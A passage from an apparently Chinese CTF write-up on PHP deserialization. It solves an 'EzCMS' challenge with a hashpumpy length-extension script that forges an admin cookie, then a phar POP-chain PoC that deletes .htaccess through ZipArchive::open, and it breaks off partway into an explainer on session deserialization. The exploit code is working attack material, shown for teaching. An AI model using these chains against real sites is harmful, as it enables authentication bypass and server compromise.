<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;EzCMS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Upload platform&lt;/h2&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;p&gt;假装这还是个无敌炫酷的前端&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;upload.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;upload&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file_error</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;something error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$admin</span> = <span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="variable">$file_name</span>, <span class="variable">$file_tmp</span>, <span class="variable">$file_size</span>);</span><br><span class="line">    <span class="variable">$admin</span>-&gt;<span class="title function_ invoke__">upload_file</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$sandbox</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$sandbox</span>.<span class="string">&#x27;/.htaccess&#x27;</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$sandbox</span>.<span class="string">&#x27;/.htaccess&#x27;</span>, <span class="string">&#x27;lolololol, i control all&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;view my file : &quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$path</span> = <span class="string">&quot;./&quot;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">while</span> ((<span class="variable">$filename</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$dir</span>)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$filename</span> != <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$filename</span> != <span class="string">&#x27;..&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$files</span>[] = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="variable">$filepath</span> = <span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$v</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;width: 1000px; height: 30px;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;Ariel&gt;filename: <span class="subst">&#123;$v&#125;</span>&lt;/Ariel&gt;</span></span><br><span class="line"><span class="string">        &lt;a href=&quot;view.php?filename=<span class="subst">&#123;$v&#125;</span>&amp;filepath=<span class="subst">&#123;$filepath&#125;</span>&quot;&gt;view detail&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$dir</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在index.php里，我们传入username和password，密码不能为admin即可正常登录，赋值给session接下来调用了login()函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$secret</span> = <span class="string">&quot;********&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;hash&quot;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="string">&quot;adminadmin&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>login函数将密钥和adminadmin拼接。然后MD5加密。赋值给cookies[‘hash’]<br>
也就是说。我们登陆成功后。会有一个cookie hash:md5(密钥+‘adminadmin’)<br>
继续往下看。登陆成功后。会到upload页面。上传文件显示不是admin。那么我们就着重看下这部分代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="comment">//上传中的一些操作，给变量赋值啥的。</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file_error</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;something error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$admin</span> = <span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="variable">$file_name</span>, <span class="variable">$file_tmp</span>, <span class="variable">$file_size</span>);</span><br><span class="line">    <span class="variable">$admin</span>-&gt;<span class="title function_ invoke__">upload_file</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$sandbox</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里程序调用了admin类中的upload_file功能，接着往下看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file_tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_dir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content_check</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$file_tmp</span>, <span class="variable">$size</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;upload_dir = <span class="string">&#x27;sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;upload_dir))&#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$this</span>-&gt;upload_dir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;upload_dir.<span class="string">&#x27;/.htaccess&#x27;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;upload_dir.<span class="string">&#x27;/.htaccess&#x27;</span>, <span class="string">&#x27;lolololol, i control all&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$size</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file_tmp = <span class="variable">$file_tmp</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_check = <span class="keyword">new</span> <span class="title class_">Check</span>(<span class="variable language_">$this</span>-&gt;file_tmp);</span><br><span class="line">        <span class="variable">$profile</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker = <span class="variable">$profile</span>-&gt;<span class="title function_ invoke__">is_admin</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;u r not admin&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_check -&gt; <span class="title function_ invoke__">check</span>();</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$tmp</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;size &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;your file is too big&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$this</span>-&gt;file_tmp, <span class="variable">$this</span>-&gt;upload_dir.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;filename).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$ext</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到了关键代码。调用了$this-&gt;checker,如果不为True，就输出不是admin</p>
<p>继续追踪代码profile类中的is_admin函数</p>
<p>接着往下看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable">$secret</span> = <span class="string">&quot;********&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password != <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$this</span>-&gt;username.<span class="variable">$this</span>-&gt;password))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到。将我们之前登陆的用户名密码赋值给username和password<br>
然后定义了一个密钥。<br>
判断我们之前输出的用户名是不是admin。密码不能是admin<br>
然后将密钥和用户名密码拼接。MD5加密。将加密结果和cookies[‘user’]进行比较<br>
这里我们有三个可控点。用户名+密码+cookies[‘user’]</p>
<p>这里可以先使用hash拓展攻击，写个hashpump脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">sign = <span class="string">&#x27;52107b08c0f3342d2153ae1d68e6262c&#x27;</span> <span class="comment">#从cookie中获得</span></span><br><span class="line">param=<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">sign,add_data = hashpumpy.hashpump(sign,<span class="string">&#x27;adminadmin&#x27;</span>,<span class="string">&#x27;123&#x27;</span>,<span class="number">8</span>) <span class="comment">#登录时密码为123，用户名为admin,admin+123长度为8</span></span><br><span class="line">add_data = add_data[<span class="built_in">len</span>(param):]</span><br><span class="line"><span class="built_in">print</span>(sign)</span><br><span class="line"><span class="built_in">print</span>(add_data)</span><br><span class="line"><span class="built_in">print</span>(urllib.parse.quote(add_data))</span><br></pre></td></tr></table></figure>
<p>获得<code>admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00123</code></p>
<p>再添加一个名为user的cookie，值为4b2928c6b562e5e4dbd35df611b46487<br>
用新的密码重新登录，正常登录之后上传文件能够显示正常路径。</p>
<p>随便上传一个php文件可以发现存在一个.htaccess文件，使得上传的php文件无法解析<br>
存在一个检测上传文件mime类型的功能，猜测存在phar反序列化,看看config.php中的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_detail</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&#x27;</span>, <span class="variable">$this</span>-&gt;filepath))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$mine</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$this</span>-&gt;filepath);</span><br><span class="line">        <span class="variable">$store_path</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;filepath);</span><br><span class="line">        <span class="variable">$res</span>[<span class="string">&#x27;mine&#x27;</span>] = <span class="variable">$mine</span>;</span><br><span class="line">        <span class="variable">$res</span>[<span class="string">&#x27;store_path&#x27;</span>] = <span class="variable">$store_path</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>使用了mime_content_type函数来检测文件mime类型</p>
<p>寻找利用链</p>
<p>首先寻找__destruct方法，只有一个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//config.php File类</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;checker))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">upload_file</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Admin类存在upload_file方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;u r not admin&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_check -&gt; <span class="title function_ invoke__">check</span>();</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$tmp</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;size &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;your file is too big&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$this</span>-&gt;file_tmp, <span class="variable">$this</span>-&gt;upload_dir.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;filename).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$ext</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>发现Profile类存在一个__call方法、</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//__call会在在调用的方法不存在时会自动调用</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Profile类不存在upload_file方法，因此把checker车位Profile类的话就会调用这个__call函数<br>
接下来的问题就是要找到一个具有open方法的类</p>
<p><strong>使用ZipArchive::open删除.htaccess</strong></p>
<p>最后的poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;script language=&quot;php&quot;&gt;__HALT_COMPILER();&lt;/script&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$admin</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker=<span class="variable">$admin</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin=<span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;/var/www/html/sandbox/1050a6a70986f01594e231dadd01f541/.htaccess&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = ZIPARCHIVE::<span class="variable constant_">OVERWRITE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$admin</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="variable">$admin</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码很简单。准备两个类。然后将需要用到的变量赋值。生成phar就好了<br>
上传phar.phar，然后通过view.php触发。</p>
<h3 id="session反序列化"><a class="markdownIt-Anchor" href="#session反序列化"></a> Session反序列化</h3>
<p>该节内容摘抄自<a href="https://www.freebuf.com/articles/web/324519.html">PHP session反序列化漏洞原理解析 - FreeBuf网络安全行业门户</a>，session反序列化的实用性还是蛮强的，harden3师傅写的很细~</p>
<h4 id="什么是session"><a class="markdownIt-Anchor" href="#什么是session"></a> 什么是session</h4>
<p>官方<code>Session</code>定义：在计算机中，尤其是在网络应用中，称为“会话控制”。<code>Session</code>对象存储特定用户会话所需的属性及配置信息。主要有以下特点：</p>
<blockquote>
<p><code>session</code>保存的位置是在服务器端</p>
<p><code>session</code>通常是要配合<code>cookie</code>使用</p>
</blockquote>
<p>因为HTTP的无状态性，服务端产生了<code>session</code>来标识当前的用户状态</p>
<p>本质上，<code>session</code>就是一种可以维持服务器端的数据存储技术。即**<code>session</code>技术就是一种基于后端有别于数据库的临时存储数据的技术**</p>
<h4 id="php-session工作流程"><a class="markdownIt-Anchor" href="#php-session工作流程"></a> PHP session工作流程</h4>
<p>以PHP为例，理解<code>session</code>的原理</p>
<ol>
<li>PHP脚本使用 session_start()时开启<code>session</code>会话，会自动检测<code>PHPSESSID</code>
<ul>
<li>如果<code>Cookie</code>中存在，获取<code>PHPSESSID</code></li>
<li>如果<code>Cookie</code>中不存在，创建一个<code>PHPSESSID</code>，并通过响应头以<code>Cookie</code>形式保存到浏览器</li>
</ul>
</li>
<li>初始化超全局变量<code>$_SESSION</code>为一个空数组</li>
<li>PHP通过<code>PHPSESSID</code>去指定位置（<code>PHPSESSID</code>文件存储位置）匹配对应的文件
<ul>
<li>存在该文件：读取文件内容（通过反序列化方式），将数据存储到<code>$_SESSION</code>中</li>
<li>不存在该文件： session_start()创建一个<code>PHPSESSID</code>命名文件</li>
</ul>
</li>
<li>程序执行结束，将<code>$_SESSION</code>中保存的所有数据序列化存储到<code>PHPSESSID</code>对应的文件中</li>
</ol>
<p>具体原理图：</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988659_622b0d7380818dab56a63-166727395787419.jpeg" alt="img"></p>
<h4 id="phpini-session配置"><a class="markdownIt-Anchor" href="#phpini-session配置"></a> php.ini session配置</h4>
<p><code>php.ini</code>里面有较重要的<code>session</code>配置项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_path=&quot;/tmp&quot;      --设置session文件的存储位置</span><br><span class="line">session.save_handler=files    --设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数</span><br><span class="line">session.auto_start= 0          --指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动</span><br><span class="line">session.serialize_handler= php --定义用来序列化/反序列化的处理器名字，默认使用php  </span><br><span class="line">session.upload_progress.enabled= On --启用上传进度跟踪，并填充$ _SESSION变量，默认启用</span><br><span class="line">session.upload_progress.cleanup= oN --读取所有POST数据（即完成上传）后立即清理进度信息，默认启用</span><br></pre></td></tr></table></figure>
<h4 id="php-session序列化机制"><a class="markdownIt-Anchor" href="#php-session序列化机制"></a> PHP session序列化机制</h4>
<p>根据<code>php.ini</code>中的配置项，我们研究将<code>$_SESSION</code>中保存的所有数据序列化存储到<code>PHPSESSID</code>对应的文件中，使用的三种不同的处理格式，即<code>session.serialize_handler</code>定义的三种引擎：</p>
<table>
<thead>
<tr>
<th style="text-align:center">处理器</th>
<th style="text-align:center">对应的存储格式</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">php</td>
<td style="text-align:center">键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td style="text-align:center">php_binary</td>
<td style="text-align:center">键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td style="text-align:center">php_serialize (php&gt;=5.5.4)</td>
<td style="text-align:center">经过 serialize() 函数反序列处理的数组</td>
</tr>
</tbody>
</table>
<h4 id="php处理器"><a class="markdownIt-Anchor" href="#php处理器"></a> php处理器</h4>
<p>首先来看看默认<code>session.serialize_handler = php</code>时候的序列化结果，代码如下</p>
